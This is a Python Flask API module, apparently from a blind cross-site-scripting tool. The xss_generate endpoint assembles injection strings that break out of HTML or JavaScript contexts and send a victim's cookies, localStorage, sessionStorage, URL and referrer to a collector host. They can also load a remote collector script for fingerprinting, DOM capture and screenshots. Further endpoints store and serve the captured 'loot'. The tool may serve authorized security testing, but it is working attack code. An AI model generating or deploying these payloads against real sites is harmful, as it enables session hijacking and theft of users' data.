import base64
import json

from app import db
from app.api import bp
from app.decorators import permissions
from app.models import XSS, Client
from flask import jsonify, request
from flask_jwt_extended import jwt_required

PAYLOADS = {
    "cookies": 'cookies="+encodeURIComponent(document.cookie)+"',
    "local_storage": 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))+"',
    "session_storage": 'session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))+"',
    "origin_url": 'origin_url="+encodeURIComponent(location.href)+"',
    "referrer": 'referrer="+encodeURIComponent(document.referrer)+"',
}


@bp.route("/xss/generate", methods=["POST"])
@jwt_required()
def xss_generate():
    """Generates an XSS payload"""

    data = request.get_json()

    client_id = data.get("client_id", None)
    if not client_id:
        return jsonify({"status": "error", "detail": "Missing client_id"}), 400
    client = Client.query.filter_by(id=data["client_id"]).first_or_404()

    url = data.get("url", None)
    if not url:
        return jsonify({"status": "error", "detail": "Missing url"}), 400

    xss_type = data.get("xss_type", None)
    if not xss_type:
        return jsonify({"status": "error", "detail": "Missing xss_type"}), 400

    code_type = data.get("code_type", None)
    if not code_type:
        return jsonify({"status": "error", "detail": "Missing code_type"}), 400

    to_gather = data.get("to_gather", [])

    other_data = data.get("other_data", {})

    if code_type == "html":
        if "fingerprint" in to_gather or "dom" in to_gather or "screenshot" in to_gather:
            payload_start = f'\'>"><script src={url}/static/collector.min.js></script><script>sendData("'
            payload_mid = str(
                base64.b64encode(str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "to_gather": to_gather, "other_data": other_data})))
            )
            payload_end = '")</script>'
            payload = payload_start + payload_mid + payload_end
            return (payload), 200

        elif "local_storage" in to_gather or "session_storage" in to_gather or "cookies" in to_gather or "origin" in to_gather or "referrer" in to_gather:
            payload_start = f'\'>"><script>new Image().src="{url}/api/x/{xss_type}/{client.uid}?'

            payload_other_data = "&".join({f"{k}={v}" for k, v in other_data.items()})
            payload_to_gather = "&".join([v for k, v in PAYLOADS.items() if k in to_gather]).rstrip('+"')

            payload_mid = "&".join([payload_other_data, payload_to_gather]) if payload_other_data else payload_to_gather
            payload_end = "</script>"
            payload = payload_start + payload_mid + payload_end
            return (payload), 200

        else:
            payload_start = f'\'>"><img src="{url}/api/x/{xss_type}/{client.uid}'
            payload_other_data = "&".join({f"{k}={v}" for k, v in other_data.items()})
            payload_start = f"{payload_start}?{payload_other_data}" if payload_other_data else payload_start
            payload_end = '" />'
            payload = payload_start + payload_end
            return (payload), 200

    else:
        if "fingerprint" in to_gather or "dom" in to_gather or "screenshot" in to_gather:
            payload_start = f';}};var js=document.createElement("script");js.src="{url}/static/collector.min.js";js.onload=function(){{sendData("'
            payload_mid = str(
                base64.b64encode(str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "to_gather": to_gather, "other_data": other_data})))
            )
            payload_end = '")};document.body.appendChild(js);'
            payload = payload_start + payload_mid + payload_end
            return (payload), 200

        else:
            payload_start = f';}};new Image().src="{url}/api/x/{xss_type}/{client.uid}"'

            payload_other_data = "&".join({f"{k}={v}" for k, v in other_data.items()})
            payload_to_gather = "&".join([v for k, v in PAYLOADS.items() if k in to_gather]).rstrip('+"')

            payload_start = f"""{payload_start.rstrip('"')}?""" if payload_other_data or payload_to_gather else payload_start

            payload_mid = ""
            if payload_other_data and payload_to_gather:
                payload_mid = "&".join([payload_other_data, payload_to_gather])
            elif payload_other_data:
                payload_mid = payload_other_data
            elif payload_to_gather:
                payload_mid = payload_to_gather

            payload_end = ";"
            payload = payload_start + payload_mid + payload_end
            return (payload), 200


@bp.route("/xss/<int:xss_id>", methods=["GET"])
@jwt_required()
def client_xss_get(xss_id):
    """Gets a single XSS instance"""
    xss = XSS.query.filter_by(id=xss_id).first_or_404()

    return jsonify(xss.to_dict()), 200


@bp.route("/xss/<int:xss_id>", methods=["DELETE"])
@jwt_required()
@permissions(one_of=["admin", "owner"])
def xss_delete(xss_id):
    """Deletes an XSS"""
    xss = XSS.query.filter_by(id=xss_id).first_or_404()

    db.session.delete(xss)
    db.session.commit()

    return jsonify({"status": "OK", "detail": "XSS deleted successfuly"}), 200


@bp.route("/xss/<int:xss_id>/data/<loot_type>", methods=["GET"])
@jwt_required()
def xss_loot_get(xss_id, loot_type):
    """Gets a specific type of data for an XSS"""
    xss = XSS.query.filter_by(id=xss_id).first_or_404()

    data = json.loads(xss.data)

    return jsonify({"data": data[loot_type]}), 200


@bp.route("/xss/<int:xss_id>/data/<loot_type>", methods=["DELETE"])
@jwt_required()
@permissions(one_of=["admin", "owner"])
def xss_loot_delete(xss_id, loot_type):
    """Deletes a specific type of data for an XSS"""
    xss = XSS.query.filter_by(id=xss_id).first_or_404()

    data = json.loads(xss.data)

    data.pop(loot_type, None)

    xss.data = json.dumps(data)

    db.session.commit()

    return jsonify({"status": "OK", "detail": "Data deleted successfuly"}), 200


@bp.route("/xss", methods=["GET"])
@jwt_required()
def client_xss_all_get():
    """Gets all XSS based on a filter"""

    filter_expression = {}
    parameters = request.args.to_dict()

    if "client_id" in parameters:
        if not parameters["client_id"].isnumeric():
            return jsonify({"status": "error", "detail": "Bad client ID"}), 400
        filter_expression["client_id"] = parameters["client_id"]
    if "type" in parameters:
        if parameters["type"] != "reflected" and parameters["type"] != "stored":
            return jsonify({"status": "error", "detail": "Unknown XSS type"}), 400
        filter_expression["xss_type"] = parameters["type"]

    xss_list = []
    xss = XSS.query.filter_by(**filter_expression).all()

    for hit in xss:
        xss_list.append(hit.to_dict_short())

    return jsonify(xss_list), 200


@bp.route("/xss/data", methods=["GET"])
@jwt_required()
def client_loot_get():
    """Get all captured data based on a filter"""
    loot = {}

    filter_expression = {}
    parameters = request.args.to_dict()

    if "client_id" in parameters:
        if not parameters["client_id"].isnumeric():
            return jsonify({"status": "error", "detail": "Bad client ID"}), 400
        filter_expression["client_id"] = parameters["client_id"]

    xss = XSS.query.filter_by(**filter_expression).all()

    for hit in xss:
        for element in json.loads(hit.data).items():
            if element[0] not in loot.keys():
                loot[element[0]] = []
            if element[0] == "fingerprint" or element[0] == "dom" or element[0] == "screenshot":
                loot[element[0]].append({hit.id: ""})
            else:
                loot[element[0]].append({hit.id: element[1]})

    return jsonify(loot), 200
